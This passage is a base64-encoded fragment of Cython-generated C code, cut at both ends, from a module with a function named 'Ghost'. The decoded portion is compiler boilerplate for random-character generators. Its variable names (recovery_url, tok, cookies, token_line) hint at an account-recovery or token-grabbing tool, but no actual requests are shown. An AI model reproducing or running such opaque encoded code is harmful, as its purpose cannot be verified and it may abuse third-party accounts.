3RfNCkpIF9fUFlYX0VSUigwLCAxMjUsIF9fcHl4X0wxX2Vycm9yKQogICAgfSBlbHNlIHsKICAgICAgX19weXhfdF80ID0gX19weXhfdF8zKF9fcHl4X3RfMSk7CiAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF80KSkgewogICAgICAgIFB5T2JqZWN0KiBleGNfdHlwZSA9IFB5RXJyX09jY3VycmVkKCk7CiAgICAgICAgaWYgKGV4Y190eXBlKSB7CiAgICAgICAgICBpZiAodW5saWtlbHkoIV9fUHl4X1B5RXJyX0dpdmVuRXhjZXB0aW9uTWF0Y2hlcyhleGNfdHlwZSwgUHlFeGNfU3RvcEl0ZXJhdGlvbikpKSBfX1BZWF9FUlIoMCwgMTI1LCBfX3B5eF9MMV9lcnJvcikKICAgICAgICAgIFB5RXJyX0NsZWFyKCk7CiAgICAgICAgfQogICAgICAgIGJyZWFrOwogICAgICB9CiAgICB9CiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTsKICAgIF9fUHl4X1hHT1RSRUYoX19weXhfY3VyX3Njb3BlLT5fX3B5eF92X18pOwogICAgX19QeXhfWERFQ1JFRl9TRVQoX19weXhfY3VyX3Njb3BlLT5fX3B5eF92X18sIF9fcHl4X3RfNCk7CiAgICBfX1B5eF9HSVZFUkVGKF9fcHl4X3RfNCk7CiAgICBfX3B5eF90XzQgPSAwOwogICAgX19weXhfdF81ID0gTlVMTDsKICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF82LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfY2hvaWNlKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzYpKSBfX1BZWF9FUlIoMCwgMTI1LCBfX3B5eF9MMV9lcnJvcikKICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpOwogICAgaWYgKHVubGlrZWx5KCFfX3B5eF9jdXJfc2NvcGUtPl9fcHl4X291dGVyX3Njb3BlLT5fX3B5eF92X2FscGhhYmV0KSkgeyBfX1B5eF9SYWlzZUNsb3N1cmVOYW1lRXJyb3IoImFscGhhYmV0Iik7IF9fUFlYX0VSUigwLCAxMjUsIF9fcHl4X0wxX2Vycm9yKSB9CiAgICBfX3B5eF90XzcgPSAxOwogICAgI2lmIENZVEhPTl9VTlBBQ0tfTUVUSE9EUwogICAgaWYgKHVubGlrZWx5KFB5TWV0aG9kX0NoZWNrKF9fcHl4X3RfNikpKSB7CiAgICAgIF9fcHl4X3RfNSA9IFB5TWV0aG9kX0dFVF9TRUxGKF9fcHl4X3RfNik7CiAgICAgIGFzc2VydChfX3B5eF90XzUpOwogICAgICBQeU9iamVjdCogX19weXhfX2Z1bmN0aW9uID0gUHlNZXRob2RfR0VUX0ZVTkNUSU9OKF9fcHl4X3RfNik7CiAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzUpOwogICAgICBfX1B5eF9JTkNSRUYoX19weXhfX2Z1bmN0aW9uKTsKICAgICAgX19QeXhfREVDUkVGX1NFVChfX3B5eF90XzYsIF9fcHl4X19mdW5jdGlvbik7CiAgICAgIF9fcHl4X3RfNyA9IDA7CiAgICB9CiAgICAjZW5kaWYKICAgIHsKICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfNSwgX19weXhfY3VyX3Njb3BlLT5fX3B5eF9vdXRlcl9zY29wZS0+X19weXhfdl9hbHBoYWJldH07CiAgICAgIF9fcHl4X3RfNCA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKF9fcHl4X3RfNiwgX19weXhfY2FsbGFyZ3MrX19weXhfdF83LCAoMi1fX3B5eF90XzcpIHwgKF9fcHl4X3RfNypfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTsKICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwOwogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDsKICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgMTI1LCBfX3B5eF9MMV9lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7CiAgICB9CiAgICBpZiAodW5saWtlbHkoX19QeXhfTGlzdENvbXBfQXBwZW5kKF9fcHl4X3IsIChQeU9iamVjdCopX19weXhfdF80KSkpIF9fUFlYX0VSUigwLCAxMjUsIF9fcHl4X0wxX2Vycm9yKQogICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7CiAgfQogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwOwogIENZVEhPTl9NQVlCRV9VTlVTRURfVkFSKF9fcHl4X2N1cl9zY29wZSk7CgogIAogIGdvdG8gX19weXhfTDA7CiAgX19weXhfTDFfZXJyb3I6OwogIF9fUHl4X1hERUNSRUYoX19weXhfcik7IF9fcHl4X3IgPSAwOwogIF9fUHl4X1hERUNSRUYoX19weXhfdF8xKTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNCk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdF82KTsKICBpZiAoX19QeXhfUHlFcnJfT2NjdXJyZWQoKSkgewogICAgX19QeXhfR2VuZXJhdG9yX1JlcGxhY2VfU3RvcEl0ZXJhdGlvbigwKTsKICAgIF9fUHl4X0FkZFRyYWNlYmFjaygiZ2VuZXhwciIsIF9fcHl4X2NsaW5lbm8sIF9fcHl4X2xpbmVubywgX19weXhfZmlsZW5hbWUpOwogIH0KICBfX3B5eF9MMDo7CiAgX19QeXhfWEdJVkVSRUYoX19weXhfcik7CiAgI2lmICFDWVRIT05fVVNFX0VYQ19JTkZPX1NUQUNLCiAgX19QeXhfQ29yb3V0aW5lX1Jlc2V0QW5kQ2xlYXJFeGNlcHRpb24oX19weXhfZ2VuZXJhdG9yKTsKICAjZW5kaWYKICBfX3B5eF9nZW5lcmF0b3ItPnJlc3VtZV9sYWJlbCA9IC0xOwogIF9fUHl4X0Nvcm91dGluZV9jbGVhcigoUHlPYmplY3QqKV9fcHl4X2dlbmVyYXRvcik7CiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7CiAgcmV0dXJuIF9fcHl4X3I7Cn0Kc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9nYl8yYXdfNUdob3N0XzhnZW5lcmF0b3IyKF9fcHl4X0Nvcm91dGluZU9iamVjdCAqX19weXhfZ2VuZXJhdG9yLCBDWVRIT05fVU5VU0VEIFB5VGhyZWFkU3RhdGUgKl9fcHl4X3RzdGF0ZSwgUHlPYmplY3QgKl9fcHl4X3NlbnRfdmFsdWUpOyAKCgoKc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9wZl8yYXdfNUdob3N0XzZnZW5leHByKFB5T2JqZWN0ICpfX3B5eF9zZWxmLCBQeU9iamVjdCAqX19weXhfZ2VuZXhwcl9hcmdfMCkgewogIHN0cnVjdCBfX3B5eF9vYmpfMmF3X19fcHl4X3Njb3BlX3N0cnVjdF8zX2dlbmV4cHIgKl9fcHl4X2N1cl9zY29wZTsKICBQeU9iamVjdCAqX19weXhfciA9IE5VTEw7CiAgX19QeXhfUmVmTmFubnlEZWNsYXJhdGlvbnMKICBpbnQgX19weXhfbGluZW5vID0gMDsKICBjb25zdCBjaGFyICpfX3B5eF9maWxlbmFtZSA9IE5VTEw7CiAgaW50IF9fcHl4X2NsaW5lbm8gPSAwOwogIF9fUHl4X1JlZk5hbm55U2V0dXBDb250ZXh0KCJnZW5leHByIiwgMCk7CiAgX19weXhfY3VyX3Njb3BlID0gKHN0cnVjdCBfX3B5eF9vYmpfMmF3X19fcHl4X3Njb3BlX3N0cnVjdF8zX2dlbmV4cHIgKilfX3B5eF90cF9uZXdfMmF3X19fcHl4X3Njb3BlX3N0cnVjdF8zX2dlbmV4cHIoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfcHR5cGVfMmF3X19fcHl4X3Njb3BlX3N0cnVjdF8zX2dlbmV4cHIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X3R1cGxlLCBOVUxMKTsKICBpZiAodW5saWtlbHkoIV9fcHl4X2N1cl9zY29wZSkpIHsKICAgIF9fcHl4X2N1cl9zY29wZSA9ICgoc3RydWN0IF9fcHl4X29ial8yYXdfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwciAqKVB5X05vbmUpOwogICAgX19QeXhfSU5DUkVGKFB5X05vbmUpOwogICAgX19QWVhfRVJSKDAsIDEyNiwgX19weXhfTDFfZXJyb3IpCiAgfSBlbHNlIHsKICAgIF9fUHl4X0dPVFJFRigoUHlPYmplY3QgKilfX3B5eF9jdXJfc2NvcGUpOwogIH0KICBfX3B5eF9jdXJfc2NvcGUtPl9fcHl4X291dGVyX3Njb3BlID0gKHN0cnVjdCBfX3B5eF9vYmpfMmF3X19fcHl4X3Njb3BlX3N0cnVjdF9fR2hvc3QgKikgX19weXhfc2VsZjsKICBfX1B5eF9JTkNSRUYoKFB5T2JqZWN0ICopX19weXhfY3VyX3Njb3BlLT5fX3B5eF9vdXRlcl9zY29wZSk7CiAgX19QeXhfR0lWRVJFRigoUHlPYmplY3QgKilfX3B5eF9jdXJfc2NvcGUtPl9fcHl4X291dGVyX3Njb3BlKTsKICBfX3B5eF9jdXJfc2NvcGUtPl9fcHl4X2dlbmV4cHJfYXJnXzAgPSBfX3B5eF9nZW5leHByX2FyZ18wOwogIF9fUHl4X0lOQ1JFRihfX3B5eF9jdXJfc2NvcGUtPl9fcHl4X2dlbmV4cHJfYXJnXzApOwogIF9fUHl4X0dJVkVSRUYoX19weXhfY3VyX3Njb3BlLT5fX3B5eF9nZW5leHByX2FyZ18wKTsKICB7CiAgICBfX3B5eF9Db3JvdXRpbmVPYmplY3QgKmdlbiA9IF9fUHl4X0dlbmVyYXRvcl9OZXcoKF9fcHl4X2Nvcm91dGluZV9ib2R5X3QpIF9fcHl4X2diXzJhd181R2hvc3RfOGdlbmVyYXRvcjIsICgoUHlPYmplY3QgKilfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9jb2Rlb2JqX3RhYlsyXSksIChQeU9iamVjdCAqKSBfX3B5eF9jdXJfc2NvcGUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9nZW5leHByLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfR2hvc3RfbG9jYWxzX2dlbmV4cHIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9hdyk7IGlmICh1bmxpa2VseSghZ2VuKSkgX19QWVhfRVJSKDAsIDEyNiwgX19weXhfTDFfZXJyb3IpCiAgICBfX1B5eF9ERUNSRUYoX19weXhfY3VyX3Njb3BlKTsKICAgIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpOwogICAgcmV0dXJuIChQeU9iamVjdCAqKSBnZW47CiAgfQoKICAKICBfX3B5eF9MMV9lcnJvcjo7CiAgX19QeXhfQWRkVHJhY2ViYWNrKCJhdy5HaG9zdC5nZW5leHByIiwgX19weXhfY2xpbmVubywgX19weXhfbGluZW5vLCBfX3B5eF9maWxlbmFtZSk7CiAgX19weXhfciA9IE5VTEw7CiAgX19QeXhfREVDUkVGKChQeU9iamVjdCAqKV9fcHl4X2N1cl9zY29wZSk7CiAgX19QeXhfWEdJVkVSRUYoX19weXhfcik7CiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7CiAgcmV0dXJuIF9fcHl4X3I7Cn0KCnN0YXRpYyBQeU9iamVjdCAqX19weXhfZ2JfMmF3XzVHaG9zdF84Z2VuZXJhdG9yMihfX3B5eF9Db3JvdXRpbmVPYmplY3QgKl9fcHl4X2dlbmVyYXRvciwgQ1lUSE9OX1VOVVNFRCBQeVRocmVhZFN0YXRlICpfX3B5eF90c3RhdGUsIFB5T2JqZWN0ICpfX3B5eF9zZW50X3ZhbHVlKSAKewogIHN0cnVjdCBfX3B5eF9vYmpfMmF3X19fcHl4X3Njb3BlX3N0cnVjdF8zX2dlbmV4cHIgKl9fcHl4X2N1cl9zY29wZSA9ICgoc3RydWN0IF9fcHl4X29ial8yYXdfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwciAqKV9fcHl4X2dlbmVyYXRvci0+Y2xvc3VyZSk7CiAgUHlPYmplY3QgKl9fcHl4X3IgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzEgPSBOVUxMOwogIFB5X3NzaXplX3QgX19weXhfdF8yOwogIFB5T2JqZWN0ICooKl9fcHl4X3RfMykoUHlPYmplY3QgKik7CiAgUHlPYmplY3QgKl9fcHl4X3RfNCA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3RfNSA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3RfNiA9IE5VTEw7CiAgc2l6ZV90IF9fcHl4X3RfNzsKICBpbnQgX19weXhfbGluZW5vID0gMDsKICBjb25zdCBjaGFyICpfX3B5eF9maWxlbmFtZSA9IE5VTEw7CiAgaW50IF9fcHl4X2NsaW5lbm8gPSAwOwogIF9fUHl4X1JlZk5hbm55RGVjbGFyYXRpb25zCiAgX19QeXhfUmVmTmFubnlTZXR1cENvbnRleHQoImdlbmV4cHIiLCAwKTsKICBzd2l0Y2ggKF9fcHl4X2dlbmVyYXRvci0+cmVzdW1lX2xhYmVsKSB7CiAgICBjYXNlIDA6IGdvdG8gX19weXhfTDNfZmlyc3RfcnVuOwogICAgZGVmYXVsdDogCiAgICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTsKICAgIHJldHVybiBOVUxMOwogIH0KICBfX3B5eF9MM19maXJzdF9ydW46OwogIGlmICh1bmxpa2VseSghX19weXhfc2VudF92YWx1ZSkpIF9fUFlYX0VSUigwLCAxMjYsIF9fcHl4X0wxX2Vycm9yKQogIF9fcHl4X3IgPSBQeUxpc3RfTmV3KDApOyBpZiAodW5saWtlbHkoIV9fcHl4X3IpKSBfX1BZWF9FUlIoMCwgMTI2LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfcik7CiAgaWYgKHVubGlrZWx5KCFfX3B5eF9jdXJfc2NvcGUtPl9fcHl4X2dlbmV4cHJfYXJnXzApKSB7IF9fUHl4X1JhaXNlVW5ib3VuZExvY2FsRXJyb3IoIi4wIik7IF9fUFlYX0VSUigwLCAxMjYsIF9fcHl4X0wxX2Vycm9yKSB9CiAgaWYgKGxpa2VseShQeUxpc3RfQ2hlY2tFeGFjdChfX3B5eF9jdXJfc2NvcGUtPl9fcHl4X2dlbmV4cHJfYXJnXzApKSB8fCBQeVR1cGxlX0NoZWNrRXhhY3QoX19weXhfY3VyX3Njb3BlLT5fX3B5eF9nZW5leHByX2FyZ18wKSkgewogICAgX19weXhfdF8xID0gX19weXhfY3VyX3Njb3BlLT5fX3B5eF9nZW5leHByX2FyZ18wOyBfX1B5eF9JTkNSRUYoX19weXhfdF8xKTsKICAgIF9fcHl4X3RfMiA9IDA7CiAgICBfX3B5eF90XzMgPSBOVUxMOwogIH0gZWxzZSB7CiAgICBfX3B5eF90XzIgPSAtMTsgX19weXhfdF8xID0gUHlPYmplY3RfR2V0SXRlcihfX3B5eF9jdXJfc2NvcGUtPl9fcHl4X2dlbmV4cHJfYXJnXzApOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCAxMjYsIF9fcHl4X0wxX2Vycm9yKQogICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMSk7CiAgICBfX3B5eF90XzMgPSAoQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSkgPyBQeUl0ZXJfTmV4dCA6IF9fUHl4X1B5T2JqZWN0X0dldEl0ZXJOZXh0RnVuYyhfX3B5eF90XzEpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCAxMjYsIF9fcHl4X0wxX2Vycm9yKQogIH0KICBmb3IgKDs7KSB7CiAgICBpZiAobGlrZWx5KCFfX3B5eF90XzMpKSB7CiAgICAgIGlmIChsaWtlbHkoUHlMaXN0X0NoZWNrRXhhY3QoX19weXhfdF8xKSkpIHsKICAgICAgICB7CiAgICAgICAgICBQeV9zc2l6ZV90IF9fcHl4X3RlbXAgPSBfX1B5eF9QeUxpc3RfR0VUX1NJWkUoX19weXhfdF8xKTsKICAgICAgICAgICNpZiAhQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkUKICAgICAgICAgIGlmICh1bmxpa2VseSgoX19weXhfdGVtcCA8IDApKSkgX19QWVhfRVJSKDAsIDEyNiwgX19weXhfTDFfZXJyb3IpCiAgICAgICAgICAjZW5kaWYKICAgICAgICAgIGlmIChfX3B5eF90XzIgPj0gX19weXhfdGVtcCkgYnJlYWs7CiAgICAgICAgfQogICAgICAgIF9fcHl4X3RfNCA9IF9fUHl4X1B5TGlzdF9HZXRJdGVtUmVmKF9fcHl4X3RfMSwgX19weXhfdF8yKTsKICAgICAgICArK19fcHl4X3RfMjsKICAgICAgfSBlbHNlIHsKICAgICAgICB7CiAgICAgICAgICBQeV9zc2l6ZV90IF9fcHl4X3RlbXAgPSBfX1B5eF9QeVR1cGxlX0dFVF9TSVpFKF9fcHl4X3RfMSk7CiAgICAgICAgICAjaWYgIUNZVEhPTl9BU1NVTUVfU0FGRV9TSVpFCiAgICAgICAgICBpZiAodW5saWtlbHkoKF9fcHl4X3RlbXAgPCAwKSkpIF9fUFlYX0VSUigwLCAxMjYsIF9fcHl4X0wxX2Vycm9yKQogICAgICAgICAgI2VuZGlmCiAgICAgICAgICBpZiAoX19weXhfdF8yID49IF9fcHl4X3RlbXApIGJyZWFrOwogICAgICAgIH0KICAgICAgICAjaWYgQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAmJiAhQ1lUSE9OX0FWT0lEX0JPUlJPV0VEX1JFRlMKICAgICAgICBfX3B5eF90XzQgPSBfX1B5eF9OZXdSZWYoUHlUdXBsZV9HRVRfSVRFTShfX3B5eF90XzEsIF9fcHl4X3RfMikpOwogICAgICAgICNlbHNlCiAgICAgICAgX19weXhfdF80ID0gX19QeXhfUHlTZXF1ZW5jZV9JVEVNKF9fcHl4X3RfMSwgX19weXhfdF8yKTsKICAgICAgICAjZW5kaWYKICAgICAgICArK19fcHl4X3RfMjsKICAgICAgfQogICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAxMjYsIF9fcHl4X0wxX2Vycm9yKQogICAgfSBlbHNlIHsKICAgICAgX19weXhfdF80ID0gX19weXhfdF8zKF9fcHl4X3RfMSk7CiAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF80KSkgewogICAgICAgIFB5T2JqZWN0KiBleGNfdHlwZSA9IFB5RXJyX09jY3VycmVkKCk7CiAgICAgICAgaWYgKGV4Y190eXBlKSB7CiAgICAgICAgICBpZiAodW5saWtlbHkoIV9fUHl4X1B5RXJyX0dpdmVuRXhjZXB0aW9uTWF0Y2hlcyhleGNfdHlwZSwgUHlFeGNfU3RvcEl0ZXJhdGlvbikpKSBfX1BZWF9FUlIoMCwgMTI2LCBfX3B5eF9MMV9lcnJvcikKICAgICAgICAgIFB5RXJyX0NsZWFyKCk7CiAgICAgICAgfQogICAgICAgIGJyZWFrOwogICAgICB9CiAgICB9CiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTsKICAgIF9fUHl4X1hHT1RSRUYoX19weXhfY3VyX3Njb3BlLT5fX3B5eF92X18pOwogICAgX19QeXhfWERFQ1JFRl9TRVQoX19weXhfY3VyX3Njb3BlLT5fX3B5eF92X18sIF9fcHl4X3RfNCk7CiAgICBfX1B5eF9HSVZFUkVGKF9fcHl4X3RfNCk7CiAgICBfX3B5eF90XzQgPSAwOwogICAgX19weXhfdF81ID0gTlVMTDsKICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF82LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfY2hvaWNlKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzYpKSBfX1BZWF9FUlIoMCwgMTI2LCBfX3B5eF9MMV9lcnJvcikKICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpOwogICAgaWYgKHVubGlrZWx5KCFfX3B5eF9jdXJfc2NvcGUtPl9fcHl4X291dGVyX3Njb3BlLT5fX3B5eF92X2FscGhhYmV0KSkgeyBfX1B5eF9SYWlzZUNsb3N1cmVOYW1lRXJyb3IoImFscGhhYmV0Iik7IF9fUFlYX0VSUigwLCAxMjYsIF9fcHl4X0wxX2Vycm9yKSB9CiAgICBfX3B5eF90XzcgPSAxOwogICAgI2lmIENZVEhPTl9VTlBBQ0tfTUVUSE9EUwogICAgaWYgKHVubGlrZWx5KFB5TWV0aG9kX0NoZWNrKF9fcHl4X3RfNikpKSB7CiAgICAgIF9fcHl4X3RfNSA9IFB5TWV0aG9kX0dFVF9TRUxGKF9fcHl4X3RfNik7CiAgICAgIGFzc2VydChfX3B5eF90XzUpOwogICAgICBQeU9iamVjdCogX19weXhfX2Z1bmN0aW9uID0gUHlNZXRob2RfR0VUX0ZVTkNUSU9OKF9fcHl4X3RfNik7CiAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzUpOwogICAgICBfX1B5eF9JTkNSRUYoX19weXhfX2Z1bmN0aW9uKTsKICAgICAgX19QeXhfREVDUkVGX1NFVChfX3B5eF90XzYsIF9fcHl4X19mdW5jdGlvbik7CiAgICAgIF9fcHl4X3RfNyA9IDA7CiAgICB9CiAgICAjZW5kaWYKICAgIHsKICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfNSwgX19weXhfY3VyX3Njb3BlLT5fX3B5eF9vdXRlcl9zY29wZS0+X19weXhfdl9hbHBoYWJldH07CiAgICAgIF9fcHl4X3RfNCA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKF9fcHl4X3RfNiwgX19weXhfY2FsbGFyZ3MrX19weXhfdF83LCAoMi1fX3B5eF90XzcpIHwgKF9fcHl4X3RfNypfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTsKICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwOwogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDsKICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgMTI2LCBfX3B5eF9MMV9lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7CiAgICB9CiAgICBpZiAodW5saWtlbHkoX19QeXhfTGlzdENvbXBfQXBwZW5kKF9fcHl4X3IsIChQeU9iamVjdCopX19weXhfdF80KSkpIF9fUFlYX0VSUigwLCAxMjYsIF9fcHl4X0wxX2Vycm9yKQogICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7CiAgfQogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwOwogIENZVEhPTl9NQVlCRV9VTlVTRURfVkFSKF9fcHl4X2N1cl9zY29wZSk7CgogIAogIGdvdG8gX19weXhfTDA7CiAgX19weXhfTDFfZXJyb3I6OwogIF9fUHl4X1hERUNSRUYoX19weXhfcik7IF9fcHl4X3IgPSAwOwogIF9fUHl4X1hERUNSRUYoX19weXhfdF8xKTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNCk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdF82KTsKICBpZiAoX19QeXhfUHlFcnJfT2NjdXJyZWQoKSkgewogICAgX19QeXhfR2VuZXJhdG9yX1JlcGxhY2VfU3RvcEl0ZXJhdGlvbigwKTsKICAgIF9fUHl4X0FkZFRyYWNlYmFjaygiZ2VuZXhwciIsIF9fcHl4X2NsaW5lbm8sIF9fcHl4X2xpbmVubywgX19weXhfZmlsZW5hbWUpOwogIH0KICBfX3B5eF9MMDo7CiAgX19QeXhfWEdJVkVSRUYoX19weXhfcik7CiAgI2lmICFDWVRIT05fVVNFX0VYQ19JTkZPX1NUQUNLCiAgX19QeXhfQ29yb3V0aW5lX1Jlc2V0QW5kQ2xlYXJFeGNlcHRpb24oX19weXhfZ2VuZXJhdG9yKTsKICAjZW5kaWYKICBfX3B5eF9nZW5lcmF0b3ItPnJlc3VtZV9sYWJlbCA9IC0xOwogIF9fUHl4X0Nvcm91dGluZV9jbGVhcigoUHlPYmplY3QqKV9fcHl4X2dlbmVyYXRvcik7CiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7CiAgcmV0dXJuIF9fcHl4X3I7Cn0KCgoKc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9wZl8yYXdfNkdob3N0KENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKl9fcHl4X3NlbGYpIHsKICBzdHJ1Y3QgX19weXhfb2JqXzJhd19fX3B5eF9zY29wZV9zdHJ1Y3RfX0dob3N0ICpfX3B5eF9jdXJfc2NvcGU7CiAgUHlPYmplY3QgKl9fcHl4X3ZfbjEgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF92X24yID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdl9ob3N0ID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdl9oZWFkZXJzID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdl9yZWNvdmVyeV91cmwgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF92X3JlczEgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF92X21hdGNoID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdl90b2sgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF92X2Nvb2tpZXMgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF92X2hlYWRlcnMyID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdl9kYXRhID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdl9yZXNwb25zZSA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3ZfdG9rZW5fbGluZSA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3ZfZiA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3ZfZSA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X2diXzJhd181R2hvc3RfMmdlbmVyYXRvciA9IDA7CiAgUHlPYmplY3QgKl9fcHl4X2diXzJhd181R2hvc3RfNWdlbmVyYXRvcjEgPSAwOwogIFB5T2JqZWN0ICpfX3B5eF9nYl8yYXdfNUdob3N0XzhnZW5lcmF0b3IyID0gMDsKICBQeU9iamVjdCAqX19weXhfciA9IE5VTEw7CiAgX19QeXhfUmVmTmFubnlEZWNsYXJhdGlvbnMKICBQeU9iamVjdCAqX19weXhfdF8xID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF8yID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF8zID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF80ID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF81ID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF82ID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF83ID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF84ID0gTlVMTDsKICBzaXplX3QgX19weXhfdF85OwogIGludCBfX3B5eF90XzEwOwogIFB5T2JqZWN0ICpfX3B5eF90XzExID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF8xMlsxMV07CiAgUHlPYmplY3QgKl9fcHl4X3RfMTMgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzE0ID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF8xNSA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3RfMTYgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzE3ID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF8xOFs0XTsKICBQeU9iamVjdCAqX19weXhfdF8xOSA9IE5VTEw7CiAgaW50IF9fcHl4X3RfMjA7CiAgaW50IF9fcHl4X3RfMjE7CiAgaW50IF9fcHl4X3RfMjI7CiAgY2hhciBjb25zdCAqX19weXhfdF8yMzsKICBQeU9iamVjdCAqX19weXhfdF8yNCA9IE5VTEw7CiAgaW50IF9fcHl4X2xpbmVubyA9IDA7CiAgY29uc3QgY2hhciAqX19weXhfZmlsZW5hbWUgPSBOVUxMOwogIGludCBfX3B5eF9jbGluZW5vID0gMDsKICBfX1B5eF9SZWZOYW5ueVNldHVwQ29udGV4dCgiR2hvc3QiLCAwKTsKICBfX3B5eF9jdXJfc2NvcGUgPSAoc3RydWN0IF9fcHl4X29ial8yYXdfX19weXhfc2NvcGVfc3RydWN0X19HaG9zdCAqKV9fcHl4X3RwX25ld18yYXdfX19weXhfc2NvcGVfc3RydWN0X19HaG9zdChfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9wdHlwZV8yYXdfX19weXhfc2NvcGVfc3RydWN0X19HaG9zdCwgX